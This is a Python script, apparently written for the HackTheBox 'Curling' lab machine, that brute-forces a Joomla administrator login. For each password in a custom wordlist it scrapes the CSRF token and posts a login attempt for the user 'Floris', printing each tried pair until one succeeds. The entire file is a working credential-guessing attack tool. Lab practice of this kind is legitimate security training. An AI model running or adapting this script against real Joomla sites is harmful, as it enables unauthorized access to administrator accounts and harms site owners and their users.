import requests
from bs4 import BeautifulSoup

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Joomla():
 
    def __init__(self):
        self.startbruteforce()

    def startbruteforce(self):
        self.proxy = { 'http' : '127.0.0.1:8080' }
        self.url = 'http://10.10.10.150/administrator/'
        self.ret = 'aW5kZXgucGhw'
        self.option='com_login'
        self.task='login'
        self.cookies = requests.session().get(self.url).cookies.get_dict()

        with open('/root/Documents/HackTheBox/curling/customwordlist.txt', 'rb+') as f:
            passwords = ([line.rstrip() for line in f])
            f.close()
        for password in passwords:
            username = 'Floris'
            #first get for cssrf token
            r = requests.get('http://10.10.10.150/administrator/', proxies=self.proxy, cookies=self.cookies)
            soup = BeautifulSoup(r.text, 'html.parser')
            self.longstring = (soup.find_all("input", type="hidden")[-1]).get('name')

            password=password.decode('utf-8')
            data = {
                'username' : username,
                'passwd' : password,
                'option' : self.option,
                'task' : self.task,
                'return' : self.ret,
                self.longstring : 1
            }
            r = requests.post(self.url, data = data, proxies=self.proxy, cookies=self.cookies)
            soup = BeautifulSoup(r.text, 'html.parser')
            response = soup.find("div", {"class": "alert-message"})
            if response:
                print(f"{bcolors.FAIL} {username}:{password}{bcolors.ENDC}")
            else:
                print(f"{bcolors.OKGREEN} {username}:{password}{bcolors.ENDC}")
                break

joomla = Joomla()
